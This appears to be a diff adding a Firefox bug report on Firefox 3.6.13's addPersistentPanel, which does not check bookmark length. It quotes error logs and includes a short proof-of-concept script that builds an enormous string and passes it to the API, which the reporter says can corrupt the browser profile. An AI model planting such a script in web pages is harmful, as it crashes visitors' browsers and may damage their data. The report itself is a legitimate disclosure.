@@ -1,0 +1,61 @@
+addPersistentPanel issues.
+User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101203
+Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101203
+
+Not something serious, although quite annoying. I found this back in 2007, but never gave it much after thought. In Firefox the length of a bookmark is not checked in Mozilla <= 3.6.13 Firefox 4 doesn't suffer from it, which is a good thing. But when toying with addPersistentPanel in 3.6.13 I managed to first corrupt my default profile (needed to run CHKDISK to fix it), and currently, after fixing the default profile folder livemarks fail to load:
+
+-----------------------------------
+Error: this.livemarks is undefined
+Source File: file:///C:/Program%20Files/Mozilla%20Firefox/modules/utils.js
+Line: 1053
+-----------------------------------
+Error: illegal character
+Source File: file:///C:/Program%20Files/Mozilla%20Firefox/components/nsLivemarkService.js
+Line: 1, Column: 7
+----------------------------------
+So after restarting Firefox, it's impossible to add bookmarks:
+----------------------------------
+Error: uncaught exception: [Exception... "Component returned failure code: 0x80040154 (NS_ERROR_FACTORY_NOT_REGISTERED) [nsINavBookmarksService.insertBookmark]"  nsresult: "0x80040154 (NS_ERROR_FACTORY_NOT_REGISTERED)"  location: "JS frame :: file:///C:/Program%20Files/Mozilla%20Firefox/components/nsPlacesTransactionsService.js :: PCIT_doTransaction :: line 478"  data: no]
+----------------------------------
+
+Suffice to say that something is going on here. And I need to reinstall Firefox in order to fix this issue.
+
+It seems difficult to reproduce the steps, as it seemed to happen randomly. Note that I am doing a lot of testing, but my hunch is that the problem arose when I added 4 bookmarks with a huge URL, and removing them one by one from my bookmarks.
+
+<script>
+
+var bookmark = "AAAA";
+// var bookmark = unescape("%udddd");
+// it might be due to unescaped unicode chars?
+
+for(k =0; k <= 655530; k++) {
+bookmark +=bookmark;
+}
+
+for(j =0; j <= 655530; j++) {
+bookmark +=bookmark;
+}
+
+
+bookmark +=bookmark;
+bookmark +=bookmark;
+bookmark +=bookmark;
+bookmark +=bookmark;
+
+window.sidebar.addPersistentPanel(
+bookmark,
+bookmark,
+bookmark);
+
+</script>
+
+Reproducible: Always
+
+Steps to Reproduce:
+1. add bookmarks with huge URL's 
+2. remove them one by one 
+3. it might corrupt your profile.
+
+
+
+I recommend to run this on a test box, since it might corrupt your profile.
